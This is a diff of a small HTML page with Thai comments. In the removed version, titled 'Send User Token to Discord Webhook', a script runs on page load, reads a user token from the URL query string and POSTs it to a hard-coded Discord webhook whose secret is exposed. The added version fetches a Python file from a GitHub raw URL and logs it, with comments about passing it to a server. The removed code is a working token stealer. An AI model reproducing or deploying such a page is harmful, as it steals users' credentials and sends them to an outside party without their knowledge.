@@ -3,41 +3,43 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Send User Token to Discord Webhook</title>
-</head>
-<body>
-
+<title>Run Python Script from GitHub Raw</title>
 <script>
-// URL ของ Webhook ของ Discord
-const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4hsxyAWA35ZPGiJY';
-
-// ฟังก์ชันสำหรับการดึง Token ผู้ใช้งานและส่งไปยัง Webhook
-function getTokenAndSendToWebhook() {
-    // ดึง Token ผู้ใช้งานจาก URL (สมมติว่า Token ถูกเก็บใน query string)
-    const urlParams = new URLSearchParams(window.location.search);
-    const userToken = urlParams.get('token');
-
-    // สร้าง JSON object ที่จะส่งไปยัง Webhook
-    const data = {
-        content: `Token ผู้ใช้งาน: ${userToken}`
-    };
-
+function runPythonScript() {
+    // URL ของไฟล์ Python raw ใน GitHub
+    const pythonScriptUrl = 'https://raw.githubusercontent.com/Army8502/Raw850022/main/api/main.py';
+    
     // สร้าง XMLHttpRequest object
     const xhr = new XMLHttpRequest();
 
-    // กำหนดวิธีและ URL ที่จะส่งข้อมูลไป
-    xhr.open('POST', webhookUrl);
+    // กำหนดวิธีและ URL ที่จะรับไฟล์ Python จาก GitHub
+    xhr.open('GET', pythonScriptUrl);
 
-    // กำหนดหัวข้อ Content-Type เป็น application/json
-    xhr.setRequestHeader('Content-Type', 'application/json');
+    // กำหนด event listener เมื่อรับ response จาก server
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                // รับข้อมูลจากไฟล์ Python
+                const pythonScript = xhr.responseText;
+                console.log('Python Script:', pythonScript);
 
-    // ส่งข้อมูล JSON ไปยัง Webhook
-    xhr.send(JSON.stringify(data));
+                // ส่งข้อมูลไปยังเซิร์ฟเวอร์ Python
+                // โดยใช้ fetch API หรือ XMLHttpRequest
+                // เช่นเดียวกับตัวอย่างที่แสดงไว้ในข้อความก่อนหน้า
+            } else {
+                console.error('Failed to fetch Python script:', xhr.status);
+            }
+        }
+    };
+
+    // ส่ง request เพื่อรับไฟล์ Python
+    xhr.send();
 }
-
-// เรียกใช้ฟังก์ชันเมื่อเรียกใช้หน้าเว็บ
-getTokenAndSendToWebhook();
 </script>
+</head>
+<body>
+
+<button onclick="runPythonScript()">Run Python Script</button>
 
 </body>
 </html>
